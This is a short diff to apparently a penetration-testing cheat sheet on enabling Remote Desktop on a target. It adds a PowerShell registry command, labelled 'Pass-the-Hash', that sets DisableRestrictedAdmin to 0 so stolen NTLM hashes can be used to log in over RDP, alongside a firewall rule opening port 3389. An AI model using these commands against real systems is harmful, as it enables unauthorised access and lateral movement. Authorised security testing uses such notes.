@@ -12,4 +12,8 @@
 
     New-NetFirewallRule -DisplayName "Remote Desktop" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389
 
+#### 3) Enable RDP Pass-the-Hash (AD)
+
+    New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
+
 ### Then connect via RDP using any RDP client like remmina or xfreerdp to target using their credentials
